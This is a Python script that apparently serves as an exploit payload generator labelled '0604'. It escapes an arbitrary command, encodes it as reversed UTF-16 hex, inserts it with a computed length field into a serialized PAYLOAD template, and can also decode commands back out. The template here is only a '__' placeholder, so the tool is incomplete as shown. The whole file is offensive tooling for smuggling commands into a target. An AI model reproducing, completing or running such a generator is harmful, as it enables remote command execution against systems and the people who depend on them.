import html
import codecs
from xml.sax.saxutils import escape

def _0604(cmd):
    escapedcmd = escape(cmd)
    srlcmd = serialize_command(escapedcmd)
    length = 1448 + len(escapedcmd)
    hex_length = format(length * 4, 'x')
    serialized_length = hex_length[::-1]

    payload = PAYLOAD.replace("e200e200e200140024003400e200e200e200", srlcmd)
    payload = payload.replace("zzzz", serialized_length)
    return payload

serialize_payload = _0604

def deserialize_payload(p):
    idx = p.find('35009700370047')
    hex_length = p[len('__bp'):idx][::-1]

    payload_endIdx = p.rfind('02006200c6004700b300f20035009700370')
    anchor = '76004700b300f20036000200'
    srlcmd = p[p.find(anchor) + len(anchor) : payload_endIdx]
    print(srlcmd)
    return deserialize_command(srlcmd)

def serialize_command(cmd):
    return ''.join(codecs.encode(codecs.encode(x, 'utf-16be'), 'hex').decode('ascii')[::-1] for x in cmd)

def deserialize_command(cmd):
    return ''.join(codecs.decode(codecs.decode(cmd[i:i+4][::-1], "hex"), "utf-16be") for i in range(0, len(cmd), 4))
PAYLOAD = "__"

def parse_args():
    import argparse
    parser = argparse.ArgumentParser('0604 (de)serializer')
    parser.add_argument('-f', dest='useFile', action='store_true')
    parser.add_argument('-c', dest='command', type=str)
    parser.add_argument('-a', dest='action', type=str, default='e', choices=['d', 'e'])
    parser.add_argument('-t', dest='Type', type=str, default='raw', choices=['raw', 'cmd'])

    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    if args.useFile:
        args.command = open(args.command).readline().strip()
    act = 'serialize' if args.action == 'e' else 'deserialize'
    Type = 'payload' if args.Type == 'raw' else 'command'
    print(globals()['%s_%s' % (act, Type)](args.command))
